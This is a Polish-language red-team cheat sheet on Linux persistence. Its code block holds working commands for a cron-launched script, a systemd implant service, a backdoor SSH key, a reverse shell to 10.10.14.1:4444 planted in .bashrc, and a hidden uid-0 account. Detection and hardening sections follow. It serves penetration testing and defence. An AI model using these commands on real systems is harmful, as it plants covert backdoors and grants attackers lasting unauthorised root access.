---
title: "Linux Persistence"
category: "red-team"
tags: ["persistence", "linux"]
platform: "linux"
mitre: ["T1053", "T1543", "T1098"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Linux Persistence

## TL;DR
Utrzymanie dostępu: cron, systemd, klucze SSH, modyfikacja profili shell, konta. Zawsze dokumentuj i sprzątaj po zaangażowaniu.

## Techniki
```bash
# Cron
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.rev.sh") | crontab -
echo '* * * * * root /path/impl' >> /etc/cron.d/updates

# systemd service + timer
cat >/etc/systemd/system/updater.service <<'EOF'
[Service]
ExecStart=/usr/bin/impl
EOF
systemctl enable --now updater

# SSH authorized_keys (backdoor klucz)
echo 'ssh-ed25519 AAAA... atk' >> ~/.ssh/authorized_keys

# Shell rc
echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1 &' >> ~/.bashrc

# Nowe konto z uid 0 (bardzo głośne)
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svc
```

## Wykrywanie (Blue Team)
- auditd: zmiany w `/etc/cron*`, `authorized_keys`, `/etc/passwd`, jednostkach systemd.
- Baseline (AIDE) na rc-files i cron; alert na nowe konta uid 0.
- Nietypowe procesy z crona/systemd łączące się na zewnątrz.

## Mitygacja / Hardening
- Immutable/monitorowane kluczowe pliki, `auditd` reguły FIM.
- Zakaz logowania kluczem tam gdzie zbędne, rotacja `authorized_keys`.
- Zasada least privilege, brak kont uid 0 poza root.

## Źródła
- [MITRE Persistence (Linux)](https://attack.mitre.org/tactics/TA0003/)
